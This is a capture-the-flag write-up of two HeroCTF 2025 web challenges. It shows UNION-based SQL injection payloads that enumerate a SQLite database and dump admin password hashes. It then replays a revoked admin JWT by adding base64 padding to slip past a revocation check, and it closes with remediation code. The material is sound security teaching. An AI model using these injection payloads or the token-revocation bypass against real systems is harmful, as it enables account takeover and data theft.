---
layout: post
title: HeroCTF 2025 - Revoked & Revoked Revenge
date: 2025-12-05
categories: [CTF]
tags: [writeup,web,sql,python,jwt]
toc: true
published: true
---

# HeroCTF - Revoked & Revoked Revenge writeups
## Challenge Descriptions
**Revoked:**
`Your budget request for the new company personnel index has been declined. Instead, the intern has received a very small bonus in exchange for a homemade solution.
Show them their stinginess could cost them.`

**Revoked Revenge:**
`The chall maker forgot to remove a debug account... Here is the revenge challenge without this backdoor!`


Although [source code](https://github.com/HeroCTF/HeroCTF_v7/blob/master/Web/revoked/challenge/app/main.py) for a Flask app was provided, I prefer starting with black‑box testing to understand how the application behaves externally before reviewing internals.
After solving the challenge through SQL injection, I went back to the source to analyze exactly why the exploit worked.

## Revoked - Black Box Solution
When we enter the challenge we get a login screen with the option of registering a new user.
Trying a simple password `' OR 1=1;--` SQLi only returns "Invalid credentials", so we'll register a new user.

Logging in with our new user brings us into an employee directory with a search bar, and up in the top right corner is a drop-down for the logged in user.
Clicking our username reveals the option "Admin panel", but clicking that returns " You don't have the permission to access this area".
![flag_1](https://tuxpad.github.io/assets/images/ctf/2025/hero/no_access.png)

Let's try to see if the search bar is vulnerable to SQLi by just entering a single quote.
It turns out that it indeed is vulnerable, and we get an internal server error.
![search_sqli](https://tuxpad.github.io/assets/images/ctf/2025/hero/sqli.png)

So we'll start off by trying to get a UNION select query that will display properly and not result in an error.
We can discover how many columns the query returns by incrementally adding null values to the UNION SELECT until the query executes without errors.

Looking at the employee cards we can see that they display a photo, name, position, and a link,
so we'll try `' UNION SELECT null, null, null, null;--`, which returns an empty employee.
![sqli_columns](https://tuxpad.github.io/assets/images/ctf/2025/hero/sqli_columns.png)

If we change the query to `'UNION SELECT 1,2,3,4;--` we can see which is which;
- The first value affects both the photo and the link, so it appears to be an id.
- The second value is the employee name.
- The third value is not shown.
- The fourth value is the position.

![sqli_positions](https://tuxpad.github.io/assets/images/ctf/2025/hero/sqli_positions.png)

Now we know that any values we want displayed should be in the second and fourth positions.

Knowing which type of database is used will help you knowing how to enumerate it, so that's a good place to start.
I'm guessing that it's SQLite, so we can query the version to see:
`' UNION SELECT 1,sqlite_version(),3,4;--'`, which shows that it is indeed SQLite.

![sqlite_version](https://tuxpad.github.io/assets/images/ctf/2025/hero/sqlite_version.png)

Now that we know the type of database, we can enumerate the database tables:
`' UNION SELECT 1,2,3, tbl_name FROM sqlite_master WHERE type='table';--`
![sqlite_tables](https://tuxpad.github.io/assets/images/ctf/2025/hero/sqlite_tables.png)

Great! Now we know that there are four tables, and the ones that look interesting for us are users and revoked_tokens.
In order to dump the information we want we'll need to know the column names, which we can get by using the following query:
`' UNION SELECT 1,2,3, GROUP_CONCAT(name) AS column_names FROM pragma_table_info('users');--`
![users_columns](https://tuxpad.github.io/assets/images/ctf/2025/hero/users_columns.png)

Now we can see that each entry has an id, a username, a "is_admin" variable, and a password hash.
This implies two ways to get the privileges we want; either we insert a value in is_admin to indicate that our user has admin privileges, or we dump and crack the admin hash.

Either way, we need to know the kind of value used.
`' UNION SELECT 1,username,3,is_admin FROM users;--`
![is_admin_bool](https://tuxpad.github.io/assets/images/ctf/2025/hero/is_admin_bool.png)

Now we can see that the app uses integers as booleans.
We could try to insert into the database, but SQLite3 (via Python) disallows multiple SQL statements per execute() call, so stacked queries are not possible, and because the base statement is a SELECT, the UNION injection is constrained to SELECT-only syntax. Therefore no INSERT/UPDATE/DELETE payload can be executed.

Instead we will dump password hashes, and we now know that we can filter for is_admin=1 to only get hashes for admin accounts.
`' UNION SELECT 1,password_hash,1,username FROM users WHERE is_admin=1--`
![admin_hashes](https://tuxpad.github.io/assets/images/ctf/2025/hero/admin_hashes.png)

It seems that we have two admins, and we get their bcrypt hashes to attempt to crack.

Using hashcat mode 3200 with rockyou gives us `admin1:pass`.
(In a CTF where you're supposed to be able to crack the hash, rockyou is the standard wordlist)

We can now log in and access the admin panel for the flag.
![revoked_flag](https://tuxpad.github.io/assets/images/ctf/2025/hero/revoked_flag.png)


## Revoked - White Box Solution
We've already solved the challenge, but let's have a look at why it works, and how we could've figured it out by reviewing code.

From what we already know after black box testing, we will focus on:
- Login appears to not be vulnerable to SQLi
- Employee search is vulnerable to SQLi


**Login is not vulnerable to SQLi**
We start off by having a look at the code for the login.

```python
        user = conn.execute(
            "SELECT * FROM users WHERE username = ?", (username,)
        ).fetchone()
        conn.close()

        if user and bcrypt.checkpw(
            password.encode("utf-8"), user["password_hash"].encode("utf-8")
```

Here we can see a textbook example of SQLi-safe code that has a prepared statement with parameterized queries.

The SQL statement is using a placeholder, `?`, and the username is inserted into a tuple and passed, along with the SQL statement to the database engine.
SQLite parses the statement and treats the placeholder as a bound parameter slot, and then the actual username is bound to that slot as raw data. Even if you try a SQLi like `admin' OR 1=1;--`, SQLite will see it as a literal string to match exactly against the username column and not treat it as SQL syntax.
SQLite automatically doubles single quotes in string literals, safely escaping SQLi attempts.

In addition to this, the password is not part of the query at all; if the user is found in the db, it is fetched and stored in the variable user, and the password entered is hashed and compared to the hash in the user variable.


The employee search, however, is a classic example of code that is vulnerable.

```python
    cursor.execute(
        f"SELECT id, name, email, position FROM employees WHERE name LIKE '%{query}%'"
    )
```

Here we can see that the  f-string directly interpolates the user input, which sent as a query to the database, meaning that the user input will be interpreted as SQL syntax, and thus is vulnerable to injection attacks.

Furthermore, as we can see the names of the database tables and columns both in the initialization, and in the queries, constructing a query to fetch the information we need becomes trivial.

#### Remediation
The search function should be rewritten in the same manner as the login, with a prepared statement and parameterized query.

## Revoked Revenge - White Box Solution
This challenge is using exactly the same code as the previous. The only difference is that the admin with a crackable password isn't there.
Thus we need to find another way in - and here we will focus on the revoked tokens.

When attacking tokens we could try to either:
- Find the secret used to sign them in order to forge our own token
- Steal a token for impersonating a user.


In the code can see that secret key used to sign tokens is made from 32 random hex characters.
So we can forget about cracking it to forge our own token.

```python
app.config["SECRET_KEY"] = "".join(
    [secrets.choice("abcdef0123456789") for _ in range(32)]
)
```

But, the database is flushed at init.
This means that any revoked tokens in the database have been made using the current secret.

```python
def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""DROP TABLE IF EXISTS employees;""")
    cursor.execute("""DROP TABLE IF EXISTS revoked_tokens;""")
    cursor.execute("""DROP TABLE IF EXISTS users;""")
    cursor.execute("""CREATE TABLE IF NOT EXISTS users (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        username TEXT UNIQUE NOT NULL,
                        is_admin BOOL NOT NULL,
                        password_hash TEXT NOT NULL)""")
    cursor.execute("""CREATE TABLE IF NOT EXISTS revoked_tokens (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        token TEXT NOT NULL)""")
    cursor.execute("""CREATE TABLE IF NOT EXISTS employees (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        name TEXT NOT NULL,
                        email TEXT UNIQUE NOT NULL,
                        position TEXT NOT NULL,
                        phone TEXT NOT NULL,
                        location TEXT NOT NULL)""")
    conn.commit()
    conn.close()
```

As we saw previously, the employee search is vulnerable to SQLi, letting us dump revoked tokens from the database.
`' UNION SELECT 1,2,3,token FROM revoked_tokens;--`
> SCREENSHOT

Decoding the first token shows us that this is the admins token, that's the one we'll use.

```json
{
  "username": "admin",
  "is_admin": 1,
  "issued": 1764771147.1933315
}
```

The vulnerability we will exploit can be found in this part of the code:

```python
revoked = conn.execute(
    "SELECT id FROM revoked_tokens WHERE token = ?", (token,)
).fetchone()
```

This bit of code compares the exact string of the tokens in the revoked_tokens table with the token submitted by the user.

So why is this a problem?
The answer to this is that JWT are encoded in Base64url, which omits the `=` padding found in regular Base64.
And the problem here is that the PyJWT Base64url decoder is permissive: it accepts both padded and unpadded variants of the same JWT payload/signature.

So when the tokens are generated, they lack padding, and this is how they are stored in the database when they are revoked.
If we add padding in the form of `=`, or even `==`, to the end of a token, the PyJWT decoder will still be able to successfully decode it as the same token, but in the check against the revoked tokens it will no longer be a match.

Thus, we now have a valid token that bypasses the revocation check and can impersonate the admin user.
![valid_token](https://tuxpad.github.io/assets/images/ctf/2025/hero/valid_token.png)
![revenge_flag](https://tuxpad.github.io/assets/images/ctf/2025/hero/revenge_flag.png)



#### Remediation
This vulnerability can be fixed by simply stripping padding from the token submitted by the user before comparing to the revoked tokens.
Padding variations do not change the decoded JWT payload or signature, but they do change the raw string representation used in the SQL lookup.

```python
normalized_token = token.rstrip('=')
revoked = conn.execute(
    "SELECT id FROM revoked_tokens WHERE token = ?",
    (normalized_token,)
).fetchone()
```

As the code is now, this remediates the problem; the tokens generated by PyJWT don't have padding and will be inserted as such.
But, even though it is redundant, it's considered best practice to also strip the tokens inserted at logout, because we don't know how the code will be modified in the future, and adding this helps keeping the app secure.
